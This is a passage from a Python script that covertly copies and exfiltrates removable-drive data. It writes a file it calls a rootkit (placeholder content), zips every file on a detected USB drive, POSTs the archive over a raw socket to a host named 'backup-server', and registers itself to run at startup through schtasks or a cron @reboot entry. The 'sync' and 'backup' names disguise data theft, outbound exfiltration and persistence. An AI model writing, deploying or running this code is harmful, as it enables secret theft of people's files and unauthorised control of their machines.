USB_MOUNT_DIR = "/media" if platform.system() != "Windows" else "E:\\"

def ensure_target_dir():
    try:
        os.makedirs(TARGET_DIR, exist_ok=True)
    except OSError as e:
        print(f"Failed to ensure target directory: {e}")

def install_rootkit():
    try:
        rootkit_path = os.path.join(TARGET_DIR, ROOTKIT_FILE)
        with open(rootkit_path, "wb") as f:
            f.write(b"This is a rootkit placeholder.")
    except OSError as e:
        print(f"Failed to install rootkit: {e}")

def detect_usb_device():
    try:
        if platform.system() == "Windows":
            return USB_MOUNT_DIR if os.path.exists(USB_MOUNT_DIR) else None
        else:
            usb_devices = [os.path.join(USB_MOUNT_DIR, d) for d in os.listdir(USB_MOUNT_DIR) if os.path.ismount(os.path.join(USB_MOUNT_DIR, d))]
            return usb_devices[0] if usb_devices else None
    except Exception as e:
        print(f"Failed to detect USB device: {e}")
        return None

def sync_files_from_usb(usb_path):
    try:
        sync_file_path = os.path.join(TARGET_DIR, SYNC_FILE)
        with zipfile.ZipFile(sync_file_path, 'w') as zipf:
            for root, _, files in os.walk(usb_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, usb_path))
    except Exception as e:
        print(f"Failed to sync files from USB: {e}")

def upload_to_backup_server():
    try:
        sync_file_path = os.path.join(TARGET_DIR, SYNC_FILE)
        with open(sync_file_path, "rb") as f:
            # Simulate network upload (will fail in offline mode)
            data = f.read()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("backup-server", 80))
            s.sendall(b"POST /upload HTTP/1.0\r\nContent-Length: " + str(len(data)).encode() + b"\r\n\r\n" + data)
            s.close()
    except Exception as e:
        print(f"Failed to upload to backup server: {e}")

def register_autostart_task():
    try:
        if platform.system() == "Windows":
            task_name = "USB_Sync_Task"
            exe_path = os.path.abspath(__file__)
            subprocess.run(["schtasks", "/Create", "/SC", "ONSTART", "/TN", task_name, "/TR", exe_path], check=True)
        else:
            cron_job = f"@reboot python3 {os.path.abspath(__file__)}"
            cron_file = os.path.expanduser("~/.cron_usbsync")
            with open(cron_file, "w") as f:
                f.write(cron_job + "\n")
            subprocess.run(["crontab", cron_file], check=True)
    except Exception as e:
        print(f"Failed to register autostart task: {e}")

def main():
    ensure_target_dir()
    install_rootkit()

    for _ in range(3):  # Limited to 3 iterations for USB detection
        usb_device = detect_usb_device()
        if usb_device:
            sync_files_from_usb(usb_device)
            break
        time.sleep(5)  # Wait before retrying USB detection

    upload_to_backup_server()
    register_autostart_task()

if __name__ == "__main__":
    main()

